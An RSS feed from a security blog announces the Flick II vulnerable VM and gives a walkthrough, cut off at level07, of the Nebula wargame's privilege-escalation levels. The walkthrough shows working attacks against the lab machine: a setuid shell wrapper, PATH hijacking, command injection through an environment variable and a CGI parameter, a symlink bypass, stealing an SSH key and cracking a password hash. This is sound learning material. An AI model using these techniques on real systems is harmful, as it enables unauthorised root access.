<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Ctf on #!/slash/note</title>
    <link>https://leonjza.github.io/categories/ctf/</link>
    <description>Recent content in Ctf on #!/slash/note</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Fri, 21 Aug 2015 06:36:19 +0000</lastBuildDate>
    <atom:link href="https://leonjza.github.io/categories/ctf/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>flick II vuln vm with a mobile twist</title>
      <link>https://leonjza.github.io/blog/2015/08/21/flick-ii-vuln-vm-with-a-mobile-twist/</link>
      <pubDate>Fri, 21 Aug 2015 06:36:19 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/08/21/flick-ii-vuln-vm-with-a-mobile-twist/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/flickII_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;tl-dr&#34;&gt;tl;dr&lt;/h1&gt;

&lt;p&gt;Flick II just got published on &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Vulnhub&lt;/a&gt;! You should try it =)&lt;/p&gt;

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;After about a year since &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick I&lt;/a&gt;, I have finally managed to get Flick II out to VulnHub. I learned a lot from Flick I and as a result applied it to Flick II. The making of Flick II was also a very different story. If I have to compare it to the first one (which took 3 nights to build start to finish), Flick II took &lt;em&gt;waay&lt;/em&gt; longer. I think the total build / testing time must be over a month.&lt;/p&gt;

&lt;p&gt;Originally I had a whole bunch of ideas, and after lots of trial and error, came to what it has become today. I have to give a special shouts to &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;@s4gi_&lt;/a&gt; for the inspiration to go with the mobile app idea and &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for testing the first &lt;em&gt;really&lt;/em&gt; broken version :P&lt;/p&gt;

&lt;h2 id=&#34;preparation&#34;&gt;preparation&lt;/h2&gt;

&lt;p&gt;I believe Flick II will be the first Vulnerable VM on &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; with a mobile twist to it. That means you will need to either install the bundled &lt;code&gt;.apk&lt;/code&gt; on an Android phone, or run it in an Android emulator in order to progress on the path to root! The &lt;code&gt;.apk&lt;/code&gt; is self-signed so expect Android to complain about that if you install it on a phone. Don&amp;rsquo;t feel bad if you don’t trust me (aka. some random guy on the internet). If you don’t, your safest bet then is to use an emulator. The only real requirement for the &lt;code&gt;.apk&lt;/code&gt; is that the mobile app must be able to speak to the VM and be run on a relatively recent Android version.&lt;/p&gt;

&lt;p&gt;I hope you get to learn as much as I did making it!&lt;/p&gt;

&lt;p&gt;Good luck! :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>playing exploit-exercises - nebula</title>
      <link>https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises---nebula/</link>
      <pubDate>Fri, 08 May 2015 07:18:31 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises---nebula/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;Recently I decided I wanted to have a look at what &lt;a href=&#34;https://exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for &lt;a href=&#34;https://exploit-exercises.com/nebula/&#34;&gt;Nebula&lt;/a&gt;. &lt;em&gt;Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.&lt;/em&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I did not really have a lot of time on my hands and figured I should start with the &amp;ldquo;easy&amp;rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)&lt;/p&gt;

&lt;p&gt;This is the path I took to solve the 20 challenges.&lt;/p&gt;

&lt;h2 id=&#34;setup&#34;&gt;setup&lt;/h2&gt;

&lt;p&gt;On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.&lt;/p&gt;

&lt;p&gt;After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » ssh level00@192.168.217.239
no hostkey alg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;sigh&lt;/em&gt;. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the &lt;code&gt;nebula&lt;/code&gt; account to root and generated a RSA host key with: &lt;code&gt;ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key&lt;/code&gt; with no password. I was now able to log in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ » ssh level00@192.168.217.239
The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


level00@192.168.217.239&#39;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

level00@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I could see that I was now logged in as level00&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The challenges are all in their respective &lt;code&gt;flag&lt;/code&gt; folder. So if you are logged in as &lt;code&gt;level00&lt;/code&gt;, you are interested in &lt;code&gt;flag00&lt;/code&gt;. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command &lt;code&gt;getflag&lt;/code&gt; could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running &lt;code&gt;getflag&lt;/code&gt; is enough to consider a level done. I had prepared a small C setuid shell in &lt;code&gt;/var/tmp/shell.c&lt;/code&gt; with the following output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shell was reused throughout the challenges. Lets dig into the challenges themselves.&lt;/p&gt;

&lt;h2 id=&#34;level00&#34;&gt;level00&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level00/&#34;&gt;Level00&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know &lt;em&gt;about&lt;/em&gt; SUID binaries :P&lt;/p&gt;

&lt;p&gt;So, to solve level00:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lh
-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
[...]

level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level01&#34;&gt;level01&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level01/&#34;&gt;Level01&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see a bunch of UID/GID stuff being set with with &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;setresuid&lt;/code&gt; and then a system command being run with &lt;code&gt;system()&lt;/code&gt;. The problem lies in the fact that the command that is being run does not have a full path specified for the &lt;code&gt;echo&lt;/code&gt; command. Even though its called with &lt;code&gt;/usr/bin/env&lt;/code&gt;, it is possible to modify the current &lt;code&gt;PATH&lt;/code&gt; variable and have &lt;code&gt;env&lt;/code&gt; report echo as being somewhere other than where it would normally be.&lt;/p&gt;

&lt;p&gt;On the filesystem we find the &lt;code&gt;flag01&lt;/code&gt; binary and can see it is setuid for &lt;code&gt;flag01&lt;/code&gt; user (we are currently logged in as &lt;code&gt;level01&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x--- 1 flag01 level01 7.2K 2011-11-20 21:22 flag01

level01@nebula:/home/flag01$ ./flag01
and now what?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Abusing this is really easy. I decided to create my own &lt;code&gt;echo&lt;/code&gt; binary and modified &lt;code&gt;PATH&lt;/code&gt; so that it is called instead of the real &lt;code&gt;echo&lt;/code&gt;. A small note here though. The Nebula vm has &lt;code&gt;/tmp&lt;/code&gt; mounted with the &lt;code&gt;nosuid&lt;/code&gt; option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being &lt;code&gt;/var/tmp&lt;/code&gt; was not mounted separately and I had write access there :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ mount | grep &amp;quot;/tmp&amp;quot;
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)

level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, to solve level01:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ cat /var/tmp/echo
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod 4777 /var/tmp/flag01

level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo

level01@nebula:/home/flag01$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01

level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level02&#34;&gt;level02&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level02/&#34;&gt;Level02&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Level02 is very similar to Level01, except for that fact that here the line &lt;code&gt;/bin/echo %s is cool&lt;/code&gt; is copied to &lt;code&gt;buffer&lt;/code&gt; and eventually put through a &lt;code&gt;system()&lt;/code&gt; call. The value of the current environment variable &lt;code&gt;USER&lt;/code&gt; is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (&lt;em&gt;is cool&lt;/em&gt; in this case).&lt;/p&gt;

&lt;p&gt;So, to solve level02:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level02@nebula:/home/flag02$ ./flag02
about to call system(&amp;quot;/bin/echo level02 is cool&amp;quot;)
level02 is cool

level02@nebula:/home/flag02$ USER=&amp;quot;bob&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob is cool&amp;quot;)
bob is cool

level02@nebula:/home/flag02$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level02@nebula:/home/flag02$ USER=&amp;quot;bob; id;#&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob; id;# is cool&amp;quot;)
bob
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)

level02@nebula:/home/flag02$ USER=&amp;quot;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&amp;quot;)
bob

level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level03&#34;&gt;level03&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level03/&#34;&gt;Level03&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logging in as &lt;code&gt;level03&lt;/code&gt;, we find a directory and a &lt;code&gt;sh&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total 512
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh

level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
    rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the mention of a cronjob, I assumed the &lt;code&gt;writable.sh&lt;/code&gt; script was being run. From the source of the script we can see that everything in &lt;code&gt;/home/flag03/writable.d/&lt;/code&gt; will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using &lt;code&gt;bash -x&lt;/code&gt;. Once done, the file is removed. Easy to exploit.&lt;/p&gt;

&lt;p&gt;So, to solve level03:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod 4777 /var/tmp/flag03

level03@nebula:/home/flag03$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/

level03@nebula:/home/flag03$ # wait some time for the cronjob

level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level04&#34;&gt;level04&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level04/&#34;&gt;Level04&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
      printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the snippet we can see that a check is in place for the first argument to see if the string &lt;code&gt;token&lt;/code&gt; exists in it. As the token we want to read is actually called &lt;em&gt;token&lt;/em&gt; this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.&lt;/p&gt;

&lt;p&gt;So, to solve level04:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2

level04@nebula:/home/flag04$ su - flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level05&#34;&gt;level05&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level05&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Browsing to the &lt;code&gt;flag05&lt;/code&gt; directory we can see a &lt;code&gt;.backup&lt;/code&gt; directory containing a tar archive that is readable. This archive contained a private key that allowed login as the &lt;code&gt;flag05&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;So, to solve level05:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz

level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys

level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
The authenticity of host &#39;127.0.0.1 (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;127.0.0.1&#39; (ECDSA) to the list of known hosts.

[...]

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level06&#34;&gt;level06&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level06&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Legacy unix system? This immediately had me thinking that the password hash may be in &lt;code&gt;/etc/passwd&lt;/code&gt;. Older unix systems used to store passwords this way, but that is no longer the case.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hash &lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt; is something that I had to send to &lt;code&gt;john&lt;/code&gt; to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ # cat hash
ueqwOCnSGdsuM

~ # john hash
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (?)
guesses: 1  time: 0:00:00:00 DONE (Fri May  8 17:29:20 2015)  c/s: 102400  trying: 123456 - Pyramid
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The password is &lt;code&gt;hello&lt;/code&gt;.
So, to solve level06:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level07&#34;&gt;level07&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level07/&#34;&gt;Level07&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; }

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);

}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the &lt;code&gt;flag07&lt;/code&gt; directory one can see a &lt;code&gt;thttpd.conf&lt;/code&gt; file which contains the port of the webserver serving this script on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level07@nebula:/home/flag07$ grep port thttpd.conf
# Specifies an alternate port number to listen on.
port=7007
# all hostnames supported on the local machine. See thttpd(8) for details.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Exploiting the vulnerability simply meant that we have to inject commands into the &lt;code&gt;Host&lt;/code&gt; parameter. I normally use python&amp;rsquo;s urllib to ensure that fields are properly url encoded etc.&lt;/p&gt;

&lt;p&gt;So, to solve level07:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:7007/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;Host&amp;quot; : &amp;quot;127.0.0.1 &amp;amp;&amp;amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;amp;&amp;amp; chmod 4777 /var/tmp/flag07&amp;quot; })&#39;)&amp;quot;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)
&amp;gt; GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
&amp;gt; User-Agent: curl/7.37.1
&amp;gt; Host: 192.168.217.239:7007
&amp;gt; Accept: */*
&amp;gt;
* HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Content-type: text/html
&amp;lt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms

--- 127.0.0.1 ping statistics ---
